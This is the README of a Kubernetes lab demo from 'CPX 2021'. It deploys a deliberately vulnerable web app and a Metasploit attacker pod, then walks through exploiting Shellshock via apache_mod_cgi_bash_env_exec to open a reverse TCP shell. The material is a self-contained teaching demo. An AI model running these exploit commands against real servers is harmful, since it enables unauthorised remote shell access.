# CPX 2021 demo
<!-- vim-markdown-toc GFM -->

* [Requirements](#requirements)
* [Installation](#installation)
* [Demo](#demo)
* [Cleanup](#cleanup)
* [Tips](#tips)

<!-- vim-markdown-toc -->

# Requirements

- [Helm3](https://helm.sh/)
- *Highly recommended*:][K9S](https://github.com/derailed/k9s)
- If you want to demo using the hard way: [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)

# Installation
> Make sure you are using Helm3 client
```bash
# Install our sushi restaurant web page
helm install -f cpx-sushi/values.yaml --namespace sushi --create-namespace sushi-restaurant cpx-sushi
# Install the attacker client
helm install -f attacker-cpx/values.yaml --namespace attacker --create-namespace attacker-client attacker-cpx
# Ignore the stdout printed by helm
```

# Demo

Run K9S, check the namespace 'vulnerable' and verify there are 2 pods running
there:

- metasploit-client: We will use this as the "attacker machine"
- vuln-app-cpx-helm-vulnerable: We will use this as the "victim machine"

Verify the vulnerable namespace has a LoadBalancer service which is has an
external-IP assigned. Write down this value as we will need it during the
attack phase. This will allow attacking the application even from outside the
K8S cluster.

Start a shell within the metasploit container and execute:
```bash
cd /usr/src/metasploit-framework
./msfconsole -r docker/msfconsole.rc -y $APP_HOME/config/database.yml
# The metasploit framework shall start...
```

Using the metasploit framework we will exploit the <i>apache_mod_cgi_bash_env_exec</i>:
```bash
search shellshock
# Locate the module with the name apache_mod_cgi_bash_env
use exploit/multi/http/apache_mod_cgi_bash_env_exec
# Check available options
show options
# Set RHOST to the external IP of the vuln-app-cpx-helm-vulnerable
set rhost <external-ip>
# You could also use the internal cluster IP since the metasploit pod has visibility of the vulnerable pod
set rport 80
set targeturi /cgi-bin/menu
# Set the payload
set payload linux/x86/shell/reverse_tcp
# Check if target is vulnerable
check
# Exploit vulnerability
exploit
```

At this point you may get multiple sessions opened in background mode. List
them and use one of them to exploit the reverse tcp shell:
```bash
#List sessions
sessions
# Run interactive shell in session #1
sessions -i 1
# Start running commands
whoami
ls -la
```
#Cleanup
```bash
helm uninstall sushi-restaurant -n sushi
helm uninstall attacker-client -n attacker
```

# Tips

- Use K9S client to demonstrate interactively how to perform the attack, it
  will save sometime if you need to run kubectl all the time
